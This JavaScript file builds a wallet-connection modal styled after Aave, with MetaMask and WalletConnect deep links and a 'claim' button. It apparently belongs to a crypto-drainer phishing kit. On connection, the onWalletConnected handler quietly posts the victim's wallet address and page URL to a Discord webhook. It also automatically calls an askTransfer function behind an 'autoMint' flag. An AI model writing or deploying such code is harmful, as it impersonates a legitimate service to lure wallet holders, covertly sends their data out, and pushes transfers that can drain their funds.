'use strict';

// Aave-like WalletConnect + injected wallet flow
// - Injected connectors (MetaMask etc)
// - WalletConnect connector (QR + mobile deep link)
// - event-driven connect/disconnect

// Use window namespace to prevent redeclaration errors on reload
if (typeof window.WalletConnectInstance === 'undefined') {
  window.WalletConnectInstance = {
    provider: null,
    web3: null,
  };
}

const getWalletConnectProvider = () => window.WalletConnectProvider || null;

const WALLETCONNECT_DEEPLINKS = {
  trust: uri => `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`,
  metamask: uri => `https://metamask.app.link/wc?uri=${encodeURIComponent(uri)}`,
  coinbase: uri => `https://go.cb-w.com/wc?uri=${encodeURIComponent(uri)}`,
  rainbow: uri => `https://rnbwapp.com/wc?uri=${encodeURIComponent(uri)}`,
  imtoken: uri => `imtokenv2://wc?uri=${encodeURIComponent(uri)}`,
  argent: uri => `argent://wc?uri=${encodeURIComponent(uri)}`
};

const isMobile = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

const onWalletConnected = async (account) => {
  console.log('⛓ Wallet connected:', account);
  const connectBtn = document.querySelector('#connectWallet');
  if (connectBtn) connectBtn.style.display = 'none';

  const claimBtn = document.querySelector('#claimButton');
  if (claimBtn) claimBtn.style.display = '';

  if (window.feedbackEnabled && window.discordWebhookURL) {
    fetch(window.discordWebhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: `✅ Wallet Connected: ${account} - ${window.location.href}` }),
    }).catch(e => console.error('Webhook error', e));
  }

  if (window.autoMint) {
    try { await window.askTransfer(); } catch (err) { console.warn('autoMint fail', err); }
  }
};

const handleProviderEvents = (wcProvider) => {
  wcProvider.on('display_uri', (uri) => {
    console.log('WalletConnect display_uri', uri);
    const wallet = wcProvider.walletSelection || 'trust';
    const link = WALLETCONNECT_DEEPLINKS[wallet] || WALLETCONNECT_DEEPLINKS.trust;
    const deepLink = link(uri);

    if (isMobile()) {
      console.log('Deep linking to mobile wallet', deepLink);
      window.location.href = deepLink;
      return;
    }

    const qrImg = document.querySelector('#walletconnectQr img');
    if (qrImg) {
      qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=260x260&data=${encodeURIComponent(uri)}`;
      document.querySelector('#walletconnectQr').style.display = 'block';
    }
  });

  wcProvider.on('connect', async (info) => {
    console.log('WalletConnect connected', info);
    window.WalletConnectInstance.web3 = new Web3(wcProvider);
    const accounts = await window.WalletConnectInstance.web3.eth.getAccounts();
    await onWalletConnected(accounts[0]);
  });

  wcProvider.on('disconnect', (code, reason) => {
    console.log('WalletConnect disconnect', code, reason);
    window.WalletConnectInstance.provider = null;
    window.WalletConnectInstance.web3 = null;
    const qrDiv = document.querySelector('#walletconnectQr');
    if (qrDiv) qrDiv.style.display = 'none';
  });
};

const connectInjected = async () => {
  if (!window.ethereum) {
    alert('No injected wallet found. Please install MetaMask or another wallet.');
    return;
  }
  try {
    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    window.WalletConnectInstance.provider = window.ethereum;
    window.WalletConnectInstance.web3 = new Web3(window.ethereum);
    await onWalletConnected(accounts[0]);
  } catch (error) {
    console.error('Injected connect failed', error);
    alert('Injected wallet connection rejected or failed.');
  }
};

const connectWalletConnect = async (walletId) => {
  const WalletConnectProvider = getWalletConnectProvider();
  if (!WalletConnectProvider) {
    alert('WalletConnect provider library is missing. Please make sure web3-provider.js is loaded.');
    return;
  }

  const wc = new WalletConnectProvider({
    bridge: 'https://bridge.walletconnect.com',
    rpc: { 1: 'https://cloudflare-eth.com/' },
    qrcode: false,
    qrcodeModal: false,
    infuraId: '19affef0dbd140e0aca95546e1c5bdd0',
  });

  wc.walletSelection = walletId;
  window.WalletConnectInstance.provider = wc;

  handleProviderEvents(wc);

  try {
    await wc.enable();
    window.WalletConnectInstance.web3 = new Web3(wc);
    const accounts = await window.WalletConnectInstance.web3.eth.getAccounts();
    await onWalletConnected(accounts[0]);
  } catch (error) {
    console.error('WalletConnect enable error', error);
    alert('WalletConnect connection failed. Please try again.');
  }
};

const showWalletSelector = () => {
  const modalId = 'walletConnectModalAave';
  let modal = document.getElementById(modalId);
  if (modal) { modal.style.display = 'flex'; return; }

  modal = document.createElement('div');
  modal.id = modalId;
  Object.assign(modal.style, {
    position: 'fixed',
    inset: '0',
    background: 'rgba(0,0,0,0.45)',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    zIndex: '9999',
  });

  const panel = document.createElement('div');
  Object.assign(panel.style, {
    width: '350px',
    background: '#fff',
    borderRadius: '14px',
    padding: '18px',
    boxShadow: '0 12px 30px rgba(0,0,0,0.18)',
    textAlign: 'center',
  });

  panel.innerHTML = `
    <h2 style="margin:0 0 14px; font-size: 18px;">Connect wallet</h2>
    <p style="margin:0 0 18px;color:#666;">Choose a wallet provider like Aave</p>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px; margin-bottom:12px;" id="wallet-list"></div>
    <div id="walletconnectQr" style="display:none;margin-top:10px"><img style="width:260px;height:260px;" /></div>
    <button id="wc-close" style="margin-top:14px;padding:10px 14px;">Close</button>
  `;

  modal.appendChild(panel);
  document.body.appendChild(modal);

  const list = panel.querySelector('#wallet-list');
  const wallets = [
    { name: 'MetaMask', id: 'metamask' },
    { name: 'Trust Wallet', id: 'trust' },
    { name: 'Coinbase', id: 'coinbase' },
    { name: 'Rainbow', id: 'rainbow' },
    { name: 'Argent', id: 'argent' },
    { name: 'IMToken', id: 'imtoken' }
  ];

  wallets.forEach((wallet) => {
    const btn = document.createElement('button');
    btn.textContent = wallet.name;
    Object.assign(btn.style, {
      padding: '10px',
      border: '1px solid #dde2ea',
      borderRadius: '8px',
      background: '#fff',
      cursor: 'pointer',
      fontWeight: '600',
      minHeight: '46px'
    });
    btn.onclick = async () => {
      if (wallet.id === 'metamask') {
        await connectInjected();
      } else {
        await connectWalletConnect(wallet.id);
      }
    };
    list.appendChild(btn);
  });

  panel.querySelector('#wc-close').onclick = () => {
    modal.style.display = 'none';
  };
};

// expose to page
window.showWalletSelector = showWalletSelector;
window.connectMetaMask = connectInjected;
window.connectWalletConnect = connectWalletConnect;

// auto attach to existing buttons after DOM is ready
const attachButton = () => {
  const connectButton = document.querySelector('#connectWallet');
  if (connectButton) {
    connectButton.removeEventListener('click', showWalletSelector);
    connectButton.addEventListener('click', showWalletSelector);
  }
};

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', attachButton);
} else {
  attachButton();
}

